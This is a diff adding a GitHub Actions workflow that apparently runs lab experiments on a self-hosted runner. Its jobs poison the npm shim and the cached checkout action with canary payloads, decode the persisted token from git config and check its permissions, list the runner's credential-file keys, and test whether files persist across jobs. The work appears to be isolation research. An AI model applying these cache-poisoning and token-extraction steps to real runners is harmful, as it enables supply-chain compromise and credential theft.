@@ -1,0 +1,125 @@
+name: runner-experiments
+on:
+  workflow_dispatch:
+
+jobs:
+  e1-setup:
+    runs-on: [self-hosted, LAB-POC]
+    steps:
+      - uses: actions/setup-node@v4
+        with:
+          node-version: "24"
+
+  e1-poison:
+    needs: e1-setup
+    runs-on: [self-hosted, LAB-POC]
+    steps:
+      - name: poison npm shim in persistent tool cache
+        shell: powershell
+        run: |
+          $nodeRoot = Join-Path $env:RUNNER_TOOL_CACHE 'node'
+          $shims = @(Get-ChildItem -Path $nodeRoot -Recurse -Filter 'npm.cmd' -ErrorAction SilentlyContinue)
+          if ($shims.Count -eq 0) { Write-Host 'E1_SETUP_FAIL: no npm.cmd found in tool cache'; exit 1 }
+          foreach ($s in $shims) {
+            Set-Content -Path $s.FullName -Value '@echo E1_NPM_CANARY poisoned_toolcache_shim' -Encoding ascii
+            Write-Host "E1_POISONED=$($s.FullName)"
+          }
+          Set-Content -Path (Join-Path $nodeRoot 'E1_POISONED.marker') -Value 'poisoned-by-e1-poison-job'
+
+  e1-consume:
+    needs: e1-poison
+    runs-on: [self-hosted, LAB-POC]
+    steps:
+      - uses: actions/setup-node@v4
+        with:
+          node-version: "24"
+      - name: execute npm resolved from poisoned cache
+        shell: powershell
+        run: |
+          npm --version
+          Write-Host 'E1_CONSUME_DONE'
+      - uses: actions/checkout@v4
+      - name: E6 extract persisted token from git config and query perms
+        shell: powershell
+        run: |
+          $eh = git config --local --get 'http.https://github.com/.extraheader'
+          if (-not $eh) { Write-Host 'E6: no persisted credential in git config'; exit 0 }
+          $b64 = ($eh -split 'basic ')[1].Trim()
+          $plain = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64($b64))
+          $tok = ($plain -split ':', 2)[1]
+          $r = Invoke-RestMethod -Uri 'https://api.github.com/repos/madhanalagarsamy/selfhosted-runner-poc' -Headers @{ Authorization = "Bearer $tok"; 'User-Agent' = 'poc' }
+          Write-Host "E6_TOKEN_FROM_GITCONFIG=ok perms.push=$($r.permissions.push) perms.admin=$($r.permissions.admin)"
+
+  e2-credentials:
+    needs: e1-consume
+    runs-on: [self-hosted, LAB-POC]
+    steps:
+      - name: inspect runner install directory
+        shell: powershell
+        run: |
+          $tool = $env:RUNNER_TOOL_CACHE
+          $work = Split-Path $tool
+          $rd = Split-Path $work
+          Write-Host "runner_dir=$rd"
+          Get-ChildItem -Force $rd -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "entry: $($_.Name)" }
+          $cred = Join-Path $rd '.credentials'
+          if (Test-Path $cred) {
+            Write-Host "E2_CREDENTIALS_FILE=present length=$((Get-Item $cred).Length)"
+            try { $j = Get-Content $cred -Raw | ConvertFrom-Json; Write-Host "E2_CRED_KEYS=$(($j.PSObject.Properties.Name) -join ',')" } catch { Write-Host 'E2_CRED_KEYS=unparsed' }
+          } else { Write-Host 'E2_CREDENTIALS_FILE=absent' }
+          if (Test-Path (Join-Path $rd '.runner')) { Write-Host 'E2_RUNNER_FILE=present' }
+          $diag = Join-Path $rd '_diag'
+          if (Test-Path $diag) { Write-Host "E2_DIAG_FILES=$((Get-ChildItem $diag -File -ErrorAction SilentlyContinue).Count)" }
+
+  e3-poison:
+    needs: e2-credentials
+    runs-on: [self-hosted, LAB-POC]
+    steps:
+      - uses: actions/checkout@v4
+      - name: poison _actions checkout cache
+        shell: powershell
+        run: |
+          $act = Join-Path (Split-Path $env:GITHUB_WORKSPACE -Parent) '_actions\actions\checkout\v4\dist\index.js'
+          if (Test-Path $act) {
+            Set-Content -Path $act -Value 'console.log("E3_CANARY executed from poisoned _actions cache");' -Encoding utf8
+            Write-Host "E3_POISONED=$act"
+          } else { Write-Host "E3_TARGET_MISSING=$act"; exit 1 }
+
+  e3-consume:
+    needs: e3-poison
+    runs-on: [self-hosted, LAB-POC]
+    steps:
+      - uses: actions/checkout@v4
+      - name: check whether poisoned action survived
+        shell: powershell
+        run: |
+          $act = Join-Path (Split-Path $env:GITHUB_WORKSPACE -Parent) '_actions\actions\checkout\v4\dist\index.js'
+          $still = $false
+          if (Test-Path $act) { $still = Select-String -Path $act -Pattern 'E3_CANARY' -Quiet -ErrorAction SilentlyContinue }
+          if ($still) { Write-Host 'E3_STATE=still_poisoned_and_executed' } else { Write-Host 'E3_STATE=refetched_by_runner' }
+
+  e5-write:
+    needs: e3-consume
+    runs-on: [self-hosted, LAB-POC]
+    steps:
+      - name: write state outside workspace
+        shell: powershell
+        run: |
+          $sib = Join-Path (Split-Path $env:GITHUB_WORKSPACE -Parent) 'E5_MARKER.txt'
+          Set-Content -Path $sib -Value 'e5-persist-workspace-sibling'
+          $up = Join-Path $env:USERPROFILE '.e5_marker'
+          Set-Content -Path $up -Value 'e5-persist-userprofile'
+          Write-Host "E5_WROTE=$sib"
+          Write-Host "E5_WROTE=$up"
+
+  e5-verify:
+    needs: e5-write
+    runs-on: [self-hosted, LAB-POC]
+    steps:
+      - name: verify persistence across jobs
+        shell: powershell
+        run: |
+          $sib = Join-Path (Split-Path $env:GITHUB_WORKSPACE -Parent) 'E5_MARKER.txt'
+          $up = Join-Path $env:USERPROFILE '.e5_marker'
+          Write-Host "E5_SIBLING=$(if (Test-Path $sib) { 'persisted' } else { 'missing' })"
+          Write-Host "E5_USERPROFILE=$(if (Test-Path $up) { 'persisted' } else { 'missing' })"
